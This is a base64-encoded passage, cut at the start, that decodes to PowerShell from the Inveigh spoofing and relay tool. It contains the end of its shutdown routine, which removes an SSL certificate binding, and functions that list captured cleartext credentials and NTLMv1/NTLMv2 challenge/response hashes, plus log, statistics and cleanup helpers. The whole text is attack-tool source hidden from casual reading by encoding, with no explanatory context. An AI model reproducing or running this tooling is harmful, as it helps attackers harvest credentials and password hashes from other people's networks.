zX3F1ZXVlLmFkZCgiSW52ZWlnaCBSZWxheSBleGl0ZWQgYXQgJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykiKXxPdXQtTnVsbAogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIFJlbGF5IGV4aXRlZCIpfE91dC1OdWxsCgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gSW52ZWlnaCBSZWxheSBleGl0ZWQifCBPdXQtRmlsZSAkSW52ZWlnaC5sb2dfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IAoKICAgICAgICAgICAgaWYoJGludmVpZ2gucnVubmluZykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2gucnVubmluZyA9ICRmYWxzZQogICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiSW52ZWlnaCBleGl0ZWQgYXQgJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykiKXxPdXQtTnVsbAogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIGV4aXRlZCIpfE91dC1OdWxsCgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gSW52ZWlnaCBleGl0ZWQifCBPdXQtRmlsZSAkSW52ZWlnaC5sb2dfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IAoKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiVGhlcmUgYXJlIG5vIHJ1bm5pbmcgSW52ZWlnaCBmdW5jdGlvbnMiKSB8IE91dC1OdWxsCiAgICAgICAgfQogICAgCiAgICAgICAgaWYoJGludmVpZ2guSFRUUFMpCiAgICAgICAgewogICAgICAgICAgICAmICJuZXRzaCIgaHR0cCBkZWxldGUgc3NsY2VydCBpcHBvcnQ9MC4wLjAuMDo0NDMgPiAkbnVsbAoKICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzLlg1MDlTdG9yZSgiTXkiLCJMb2NhbE1hY2hpbmUiKQogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLk9wZW4oJ1JlYWRXcml0ZScpCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGUgPSAkY2VydGlmaWNhdGVfc3RvcmUuY2VydGlmaWNhdGVzLmZpbmQoIkZpbmRCeVRodW1icHJpbnQiLCRpbnZlaWdoLmNlcnRpZmljYXRlX3RodW1icHJpbnQsJEZBTFNFKVswXQogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLlJlbW92ZSgkY2VydGlmaWNhdGUpCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuQ2xvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlNTTCBDZXJ0aWZpY2F0ZSBEZWxldGlvbiBFcnJvciAtIFJlbW92ZSBNYW51YWxseSIpfE91dC1OdWxsCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNTTCBDZXJ0aWZpY2F0ZSBEZWxldGlvbiBFcnJvciAtIFJlbW92ZSBNYW51YWxseSIpfE91dC1OdWxsCgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU1NMIENlcnRpZmljYXRlIERlbGV0aW9uIEVycm9yIC0gUmVtb3ZlIE1hbnVhbGx5InxPdXQtRmlsZSAkSW52ZWlnaC5sb2dfb3V0X2ZpbGUgLUFwcGVuZCAgIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkaW52ZWlnaC5IVFRQID0gJGZhbHNlCiAgICAgICAgJGludmVpZ2guSFRUUFMgPSAkZmFsc2UKCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiVGhlcmUgYXJlIG5vIHJ1bm5pbmcgSW52ZWlnaCBmdW5jdGlvbnMiKXxPdXQtTnVsbAogICAgfQoKICAgIGlmKCRpbnZlaWdoLnN0YXR1c19vdXRwdXQpCiAgICB7CiAgICAgICAgd2hpbGUoJGludmVpZ2guc3RhdHVzX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgIHsKICAgICAgICAgICAgaWYoJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB3cml0ZS1vdXRwdXQoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBzd2l0Y2ggLXdpbGRjYXJkICgkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIkludmVpZ2ggKmV4aXRlZCAqIgogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZyAkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIlNTTCBDZXJ0aWZpY2F0ZSBEZWxldGlvbiBFcnJvciAtIFJlbW92ZSBNYW51YWxseSIKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlLXdhcm5pbmcgJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlLW91dHB1dCAkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICB9ICAgCiAgICAgICAgfQogICAgfQp9IAoKRnVuY3Rpb24gR2V0LUludmVpZ2gKewogICAgPCMKICAgIC5TWU5PUFNJUwogICAgR2V0LUludmVpZ2ggd2lsbCBkaXNwbGF5IHF1ZXVlZCBJbnZlaWdoIG91dHB1dC4KICAgICM+CiAgICB3aGlsZSgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgewogICAgICAgIGlmKCRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSkKICAgICAgICB7CiAgICAgICAgICAgIHdyaXRlLW91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIHN3aXRjaCAtd2lsZGNhcmQgKCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJJbnZlaWdoICpleGl0ZWQgKiIKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICB3cml0ZS13YXJuaW5nICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICIqIHdyaXR0ZW4gdG8gKiIKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlLXdhcm5pbmcgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAiKiBmb3IgcmVsYXkgKiIKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICB3cml0ZS13YXJuaW5nICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICIqU01CIHJlbGF5ICoiCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAiKiBsb2NhbCBhZG1pbmlzdHJhdG9yICoiCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBkZWZhdWx0CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgd3JpdGUtb3V0cHV0ICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gICAgCiAgICB9Cn0KCkZ1bmN0aW9uIEdldC1JbnZlaWdoQ2xlYXJ0ZXh0CnsKICAgIDwjCiAgICAuU1lOT1BTSVMKICAgIEdldC1JbnZlaWdoQ2xlYXJ0ZXh0IHdpbGwgZ2V0IGFsbCBjYXB0dXJlZCBjbGVhcnRleHQgY3JlZGVudGlhbHMuCiAgICAjPgogICAgJGludmVpZ2guY2xlYXJ0ZXh0X2xpc3QKfQoKRnVuY3Rpb24gR2V0LUludmVpZ2hOVExNCnsKICAgIDwjCiAgICAuU1lOT1BTSVMKICAgIEdldC1JbnZlaWdoTlRMTSB3aWxsIGdldCBhbGwgY2FwdHVyZWQgY2hhbGxlbmdlL3Jlc3BvbnNlIGhhc2hlcy4KICAgICM+CiAgICAkaW52ZWlnaC5OVExNdjFfbGlzdAogICAgJGludmVpZ2guTlRMTXYyX2xpc3QKfQoKRnVuY3Rpb24gR2V0LUludmVpZ2hOVExNdjEKewogICAgPCMKICAgIC5TWU5PUFNJUwogICAgR2V0LUludmVpZ2hOVExNdjEgd2lsbCBnZXQgY2FwdHVyZWQgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSBoYXNoZXMuCiAgICAKICAgIC5QQVJBTUVURVIgVW5pcXVlCiAgICBEaXNwbGF5IG9ubHkgdGhlIGZpcnN0IGNhcHR1cmVkIGNoYWxsZW5nZS9yZXNwb25zZSBmb3IgZWFjaCB1bmlxdWUgYWNjb3VudC4KICAgICM+CiAgICBwYXJhbQogICAgKCAKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtzd2l0Y2hdJFVuaXF1ZSwKICAgICAgICBbcGFyYW1ldGVyKFZhbHVlRnJvbVJlbWFpbmluZ0FyZ3VtZW50cz0kdHJ1ZSldICRpbnZhbGlkX3BhcmFtZXRlcgogICAgKQoKICAgIGlmICgkaW52YWxpZF9wYXJhbWV0ZXIpCiAgICB7CiAgICAgICAgdGhyb3cgIiQoJGludmFsaWRfcGFyYW1ldGVyKSBpcyBub3QgYSB2YWxpZCBwYXJhbWV0ZXIuIgogICAgfQoKICAgIGlmKCRVbmlxdWUpCiAgICB7CiAgICAgICAgJGludmVpZ2guTlRMTXYxX2xpc3Quc29ydCgpCgogICAgICAgIEZvckVhY2goJHVuaXF1ZV9OVExNdjEgaW4gJGludmVpZ2guTlRMTXYxX2xpc3QpCiAgICAgICAgewogICAgICAgICAgICAkdW5pcXVlX05UTE12MV9hY2NvdW50ID0gJHVuaXF1ZV9OVExNdjEuc3Vic3RyaW5nKDAsJHVuaXF1ZV9OVExNdjEuaW5kZXhvZigiOiIsKCR1bmlxdWVfTlRMTXYxLmluZGV4b2YoIjoiKSsyKSkpCgogICAgICAgICAgICBpZigkdW5pcXVlX05UTE12MV9hY2NvdW50IC1uZSAkdW5pcXVlX05UTE12MV9hY2NvdW50X2xhc3QpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICR1bmlxdWVfTlRMTXYxCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR1bmlxdWVfTlRMTXYxX2FjY291bnRfbGFzdCA9ICR1bmlxdWVfTlRMTXYxX2FjY291bnQKICAgICAgICB9CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guTlRMTXYxX2xpc3QKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUludmVpZ2hOVExNdjIKewogICAgPCMKICAgIC5TWU5PUFNJUwogICAgR2V0LUludmVpZ2hOVExNdjIgd2lsbCBnZXQgY2FwdHVyZWQgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSBoYXNoZXMuCgogICAgLlBBUkFNRVRFUiBVbmlxdWUKICAgIERpc3BsYXkgb25seSB0aGUgZmlyc3QgY2FwdHVyZWQgY2hhbGxlbmdlL3Jlc3BvbnNlIGZvciBlYWNoIHVuaXF1ZSBhY2NvdW50LgogICAgIz4KICAgIHBhcmFtCiAgICAoIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW3N3aXRjaF0kVW5pcXVlLAogICAgICAgIFtwYXJhbWV0ZXIoVmFsdWVGcm9tUmVtYWluaW5nQXJndW1lbnRzPSR0cnVlKV0gJGludmFsaWRfcGFyYW1ldGVyCiAgICApCgogICAgaWYgKCRpbnZhbGlkX3BhcmFtZXRlcikKICAgIHsKICAgICAgICB0aHJvdyAiJCgkaW52YWxpZF9wYXJhbWV0ZXIpIGlzIG5vdCBhIHZhbGlkIHBhcmFtZXRlci4iCiAgICB9CgogICAgaWYoJFVuaXF1ZSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5OVExNdjJfbGlzdC5zb3J0KCkKCiAgICAgICAgRm9yRWFjaCgkdW5pcXVlX05UTE12MiBpbiAkaW52ZWlnaC5OVExNdjJfbGlzdCkKICAgICAgICB7CiAgICAgICAgICAgICR1bmlxdWVfTlRMTXYyX2FjY291bnQgPSAkdW5pcXVlX05UTE12Mi5zdWJzdHJpbmcoMCwkdW5pcXVlX05UTE12Mi5pbmRleG9mKCI6IiwoJHVuaXF1ZV9OVExNdjIuaW5kZXhvZigiOiIpKzIpKSkKCiAgICAgICAgICAgIGlmKCR1bmlxdWVfTlRMTXYyX2FjY291bnQgLW5lICR1bmlxdWVfTlRMTXYyX2FjY291bnRfbGFzdCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHVuaXF1ZV9OVExNdjIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJHVuaXF1ZV9OVExNdjJfYWNjb3VudF9sYXN0ID0gJHVuaXF1ZV9OVExNdjJfYWNjb3VudAogICAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkaW52ZWlnaC5OVExNdjJfbGlzdAogICAgfQp9CgpGdW5jdGlvbiBHZXQtSW52ZWlnaExvZwp7CiAgICA8IwogICAgLlNZTk9QU0lTCiAgICBHZXQtSW52ZWlnaExvZyB3aWxsIGdldCBsb2cuCiAgICAjPgogICAgJGludmVpZ2gubG9nCn0KCkZ1bmN0aW9uIEdldC1JbnZlaWdoU3RhdAp7CiAgICA8IwogICAgLlNZTk9QU0lTCiAgICBHZXQtSW52ZWlnaExvZyB3aWxsIGdldCBsb2cuCiAgICAjPgogICAgV3JpdGUtT3V0cHV0KCJUb3RhbCBDbGVhcnRleHQgQ2FwdHVyZXMgPSAiICsgJGludmVpZ2guY2xlYXJ0ZXh0X2xpc3QuY291bnQpCiAgICBXcml0ZS1PdXRwdXQoIlRvdGFsIE5UTE12MSBDYXB0dXJlcyA9ICIgKyAkaW52ZWlnaC5OVExNdjFfbGlzdC5jb3VudCkKICAgIFdyaXRlLU91dHB1dCgiVG90YWwgTlRMTXYyIENhcHR1cmVzID0gIiArICRpbnZlaWdoLk5UTE12Ml9saXN0LmNvdW50KQp9CgpGdW5jdGlvbiBXYXRjaC1JbnZlaWdoCnsKICAgIDwjCiAgICAuU1lOT1BTSVMKICAgIFdhdGNoLUludmVpZ2ggd2lsbCBlbmFibGVkIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dC4gSWYgdXNpbmcgdGhpcyBmdW5jdGlvbiB0aHJvdWdoIGEgc2hlbGwsIHRlc3QgdG8gZW5zdXJlIHRoYXQgaXQgZG9lc24ndCBoYW5nIHRoZSBzaGVsbC4KICAgICM+CiAgICBpZigkaW52ZWlnaC50b29sIC1uZSAxKQogICAgewogICAgICAgIGlmKCRpbnZlaWdoLnJ1bm5pbmcgLW9yICRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgLW9yICRpbnZlaWdoLmJydXRlZm9yY2VfcnVubmluZykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiUHJlc3MgYW55IGtleSB0byBzdG9wIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dCIKICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9vdXRwdXQgPSAkdHJ1ZQoKICAgICAgICAgICAgOmNvbnNvbGVfbG9vcCB3aGlsZSgoKCRpbnZlaWdoLnJ1bm5pbmcgLW9yICRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgLW9yICRpbnZlaWdoLmJydXRlZm9yY2VfcnVubmluZykgLWFuZCAkaW52ZWlnaC5jb25zb2xlX291dHB1dCkgLW9yICgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkNvdW50IC1ndCAwIC1hbmQgJGludmVpZ2guY29uc29sZV9vdXRwdXQpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlLW91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaCAtd2lsZGNhcmQgKCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgICAgICAgICAgICAgIHsgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkludmVpZ2ggKmV4aXRlZCAqIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlLXdhcm5pbmcgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIiogd3JpdHRlbiB0byAqIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICIqIGZvciByZWxheSAqIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlLXdhcm5pbmcgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIipTTUIgcmVsYXkgKiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZS13YXJuaW5nICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICIqIGxvY2FsIGFkbWluaXN0cmF0b3IgKiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZS13YXJuaW5nICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZS1vdXRwdXQgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKFtjb25zb2xlXTo6S2V5QXZhaWxhYmxlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0ID0gJGZhbHNlCiAgICAgICAgICAgICAgICAgICAgQlJFQUsgY29uc29sZV9sb29wCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gNQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiSW52ZWlnaCBpc24ndCBydW5uaW5nIgogICAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIldhdGNoLUludmVpZ2ggY2Fubm90IGJlIHVzZWQgd2l0aCBjdXJyZW50IGV4dGVybmFsIHRvb2wgc2VsZWN0aW9uIgogICAgfQp9CgpGdW5jdGlvbiBDbGVhci1JbnZlaWdoCnsKICAgIDwjCiAgICAuU1lOT1BTSVMKICAgIENsZWFyLUludmVpZ2ggd2lsbCBjbGVhciBJbnZlaWdoIGRhdGEgZnJvbSBtZW1vcnkuCiAgICAjPgogICAgaWYoJGludmVpZ2gpCiAgICB7CiAgICAgICAgaWYoISRpbnZlaWdoLnJ1bm5pbmcgLWFuZCAhJGludmVpZ2gucmVsYXlfcnVubmluZyAtYW5kICEkaW52ZWlnaC5icnV0ZWZvcmNlX3J1bm5pbmcpCiAgICAgICAgewogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgaW52ZWlnaCAtc2NvcGUgZ2xvYmFsCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiSW52ZWlnaCBkYXRhIGhhcyBiZWVuIGNsZWFyZWQgZnJvbSBtZW1vcnkiCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiUnVuIFN0b3AtSW52ZWlnaCBiZWZvcmUgcnVubmluZyBDbGVhci1JbnZlaWdoIgogICAgICAgIH0KICAgIH0KfQ==
